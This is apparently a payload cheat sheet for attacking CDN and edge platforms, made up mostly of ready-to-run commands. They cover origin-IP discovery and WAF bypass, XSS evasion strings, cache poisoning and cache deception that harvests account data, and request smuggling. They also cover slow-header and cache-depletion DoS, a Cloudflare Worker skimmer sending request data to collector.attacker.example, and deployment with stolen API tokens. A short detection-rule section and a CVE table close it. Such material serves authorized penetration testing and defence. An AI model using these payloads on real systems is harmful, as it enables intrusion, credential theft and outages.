# Payloads — edge-computing-security

> Attack payloads for CDN / edge-platform security testing (authorized targets only).
> The edge layer sits in front of the origin: CDN, WAF, cache tier, edge functions,
> origin shield. Attacks here weaponize trust in "the CDN already validated this".

## 1. Edge Attack Surface Mapping

```bash
# Is the target behind a CDN? CNAME + header fingerprint
dig +short CNAME www.target.example
curl -sI https://www.target.example | grep -iE "server|cf-ray|x-cache|x-amz|via|x-served-by"

# Dedicated fingerprinters
cdncheck -u https://www.target.example
wafw00f https://www.target.example
whatweb https://www.target.example

# Multi-region view (some origins leak via geo-routing to non-CDN edges)
for loc in us eu ap; do curl -s "https://$loc.target.example/cdn-cgi/trace" | head -3; done
```

## 2. Origin IP Discovery

```bash
# Certificate transparency: every cert ever issued for the domain
curl -s "https://crt.sh/?q=%25.target.example&output=json" \
  | jq -r '.[].name_value' | sort -u > ct_subdomains.txt

# Historical DNS (SecurityTrails API): A records before CDN onboarding
curl "https://api.securitytrails.com/v1/history/target.example/dns/a" \
  -H "APIKEY: $ST_KEY" | jq -r '.records[].values[].value'

# Favicon hash pivot (finds other hosts serving the same origin error page)
httpx -u https://origin-candidate.example -favicon | shodan search "http.favicon.hash:FAVHASH"

# Origin scan excluding known CDN ranges (Cloudflare/Akamai/Fastly published CIDRs)
nmap -Pn -p 80,443,8080,8443 --excludefile cdn_ranges.txt -iL candidates.txt

# Direct validation: does this IP serve the target vhost?
curl -sk --resolve www.target.example:443:$ORIGIN_IP https://www.target.example/ -o /dev/null -w '%{http_code}\n'
```

## 3. Direct-to-Origin Bypass

```bash
# Once origin IP is known: skip CDN + WAF entirely (SNI carries the vhost)
curl -sk --resolve www.target.example:443:$ORIGIN_IP https://www.target.example/admin

# Host-header style attacks against IP-based virtual hosting
curl -sk http://$ORIGIN_IP/ -H "Host: www.target.example"

# Origin allow-list enforcement check: expect 403 from a good config
curl -sk http://$ORIGIN_IP/ -H "Host: evil.example" -o /dev/null -w '%{http_code}\n'
```

## 4. CDN/WAF Rule Bypass

```bash
# Case/encoding games against regex-based WAF rules
curl "https://www.target.example/search?q=%3CScript%3Ealert(1)%3C/Script%3E"
curl "https://www.target.example/search?q=<scr\x69pt>alert(1)</script>"

# Protocol downgrade (WAF parsers often only fully inspect HTTP/1.1 + 2)
curl --http1.0 "https://www.target.example/api?debug=1"
curl --http3 "https://www.target.example/api?debug=1"

# Slow headers pin edge workers (Slowloris-lite, authorized)
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u https://www.target.example -p 3

# IP rotation against per-IP limits (residential pool, authorized)
for node in pool1 pool2 pool3; do proxychains4 curl -s https://www.target.example/login; done
```

## 5. Web Cache Poisoning

```http
GET / HTTP/1.1
Host: www.target.example
X-Forwarded-Host: attacker.example
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Scheme: http
```

```bash
# Fat GET: body overrides params on some stacks and the body is unkeyed
curl -X GET "https://www.target.example/?lang=en" -d "lang=eng&callback=evil"

# Unkeyed parameter discovery (param-miner class tooling)
param-miner --url https://www.target.example --unkeyed

# Cache-key normalization abuse: URL fragment handling differs between
# edge cache and origin (ATS class — see CVE-2021-27577 in §13)
curl -sv "https://www.target.example/home#../../admin" | grep -E "< HTTP|location"

# Confirm the poisoned entry is served to OTHER users (the actual impact)
curl -s https://www.target.example/ | grep -c attacker.example
```

## 6. Web Cache Deception

```bash
# Suffix tricks: authenticated page cached under a static-looking path
curl -o /dev/null -w '%{http_code}\n' \
  "https://app.target.example/account/settings.js" -H "Cookie: $SESSION"

# Path-parameter and encoded separators defeat origin routing rules
curl "https://app.target.example/account/;/settings.css" -H "Cookie: $SESSION"
curl "https://app.target.example/account%2fsettings.css" -H "Cookie: $SESSION"

# Harvest: the cached object is now readable without auth
curl -s "https://app.target.example/account/settings.js" | jq .email
```

## 7. HTTP Request Smuggling at the Edge

```text
# CL.TE: front (CDN) trusts Content-Length, origin trusts Transfer-Encoding
POST / HTTP/1.1
Host: www.target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
X:
```

```bash
# Differential timing oracle: smuggled prefix delays a second request
python3 smuggler.py -u https://www.target.example -m CL.TE,TE.CL

# h2 downgrade smuggling: h2 front-end + HTTP/1.1 origin desync (ATS class — §13)
curl --http2-prior-knowledge "https://www.target.example/" -H "Content-Length: 6" -d "smug=x"
```

## 8. Edge Function Attacks

```javascript
// Cloudflare Worker credential skimmer (compromised wrangler token = implant)
addEventListener('fetch', event => {
  event.respondWith(fetch(event.request).then(response => {
    const clone = response.clone();
    event.waitUntil(
      fetch('https://collector.attacker.example/log', {
        method: 'POST',
        body: JSON.stringify({url: event.request.url, body: clone.body})
      })
    );
    return response;
  }));
});
```

```bash
# Deploy from a stolen API token (control-plane takeover)
CLOUDFLARE_API_TOKEN=$STOLEN npx wrangler deploy

# Lambda@Edge / edge middleware: probe for secrets in responses
curl -s "https://app.target.example/api/proxy?url=https://attacker.example/canary" | head
curl -s "https://app.target.example/.env" -o /dev/null -w '%{http_code}\n'

# Edge runtime metadata endpoints reachable from the function itself
curl -s -H "X-Forwarded-For: 127.0.0.1" "https://app.target.example/debug/vars"
```

## 9. Cache & Origin-Shield DoS

```bash
# Cache depletion: request uncacheable variants until shield-to-origin fan-out
for i in $(seq 1 500); do
  curl -s "https://www.target.example/item/$RANDOM?utm=$(date +%s%N)" -o /dev/null; done

# Range-request amplification against origin shield
curl -H "Range: bytes=0-1" -s "https://www.target.example/large.bin" -o /dev/null -w '%{size_download}\n'

# Slow POSTs pinned at the edge consume worker/shield concurrency
slowhttptest -B -c 300 -i 30 -r 50 -u https://www.target.example/upload
```

## 10. CDN Control-Plane Abuse

```bash
# Purge-API abuse: mass invalidation forces full re-origin (cost/DoS)
curl -X POST "https://api.cdn.example/v2/zones/$ZONE/purge_cache" \
  -H "Authorization: Bearer $CDN_TOKEN" -d '{"purge_everything":true}'

# Signed-URL token replay: does the edge bind token to path/IP/time?
curl -s "https://cdn.target.example/video.mp4?token=$LEAKED_TOKEN" -o /dev/null -w '%{http_code}\n'
curl -s "https://cdn.target.example/admin-export.zip?token=$LEAKED_TOKEN" -o /dev/null -w '%{http_code}\n'
```

## 11. Detection Engineering (Blue Perspective)

```text
# Splunk SPL: cache poisoning indicators — 2xx responses embedding external hosts
index=cdn_logs status=200 | spath input=response_body \
  | regex response_body="https?://(?!\.target\.example)[a-z0-9.-]+" \
  | stats count BY uri_path, remote_host
```

```text
# Suricata: origin-direct probes carrying target vhost in Host header
alert http any any -> $ORIGIN_NET any (msg:"EDGE direct-to-origin probe"; \
  http.host; content:"target.example"; sid:9000011; rev:1;)
```

```text
# Cache deception: authenticated paths returning HIT for static suffixes
index=cdn_logs uri_path="*account*" cache_status=HIT file_type="css|js"
```

## 12. Cleanup & OPSEC

```bash
# Purge test-injected cache entries; verify with cache-status header
curl -sI "https://www.target.example/?cachebust=$(date +%s)" | grep -i x-cache
```

## 13. Known Edge CVEs (NVD-verified)

All IDs verified against the NVD API before inclusion (KubeEdge set 2026-09-07, additions 2026-11-09).

| CVE | Product | CVSS | Summary (from NVD record) |
|-----|---------|------|----------------------------|
| CVE-2022-31074 | linuxfoundation/kubeedge | 6.5 | KubeEdge edge-orchestration vulnerability (original v0.3.2 set) |
| CVE-2022-31075 | linuxfoundation/kubeedge | 6.5 | KubeEdge edge-orchestration vulnerability (original v0.3.2 set) |
| CVE-2022-31077 | linuxfoundation/kubeedge | 5.7 | KubeEdge device-management vulnerability (original v0.3.2 set) |
| CVE-2021-27577 | Apache Traffic Server | 7.5 | Incorrect URL-fragment handling enables cache poisoning |
| CVE-2021-35474 | Apache Traffic Server cachekey plugin | 9.8 | Stack-based buffer overflow in cachekey plugin |
| CVE-2021-32565 | Apache Traffic Server | 7.5 | Invalid Content-Length values enable request smuggling |
| CVE-2021-21378 | Envoy | 8.2 | Envoy edge/middle proxy auth-bypass class in 1.17.0 |
| CVE-2017-8807 | Varnish HTTP Cache | 9.1 | Fetch-error path issue in varnishd cache process |

## 14. References

- Web Cache Deception original research (Omer Gil): https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html
- Practical Web Cache Poisoning (James Kettle): https://portswigger.net/research/practical-web-cache-poisoning
- HTTP Request Smuggling (PortSwigger): https://portswigger.net/web-security/request-smuggling
- crt.sh certificate transparency search: https://crt.sh
- Apache Traffic Server advisories: https://trafficserver.apache.org
- Envoy security advisories: https://github.com/envoyproxy/envoy/security
- Varnish Cache security: https://varnish-cache.org/
